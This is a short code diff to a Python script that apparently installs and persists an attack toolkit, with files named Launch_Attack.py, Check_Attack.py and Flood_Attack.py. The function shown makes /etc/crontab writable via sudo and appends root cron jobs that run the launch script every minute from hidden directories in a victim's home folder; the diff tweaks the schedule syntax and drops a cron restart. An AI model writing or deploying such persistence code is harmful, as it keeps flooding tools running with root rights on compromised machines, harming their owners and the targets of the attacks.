@@ -9,11 +9,9 @@ attackFiles = ['/Launch_Attack.py', '/Check_Attack.py', '/Flood_Attack.py']
 def set_up_crontab():
     os.system('sudo chmod +w /etc/crontab')
     crontab = open('/etc/crontab', 'a')
-    crontab.write('\n*/1 * * * * root sudo /usr/bin/python /home/victim/.etc/.module/Launch_Attack.py')
-    crontab.write('\n*/1 * * * * root sudo /usr/bin/python /home/victim/.var/.module/Launch_Attack.py')
+    crontab.write('\n* * * * * root sudo /usr/bin/python /home/victim/.etc/.module/Launch_Attack.py')
+    crontab.write('\n* * * * * root sudo /usr/bin/python /home/victim/.var/.module/Launch_Attack.py')
     crontab.close()
-
-    os.system('sudo /etc/init.d/cron restart')
 
     return
 
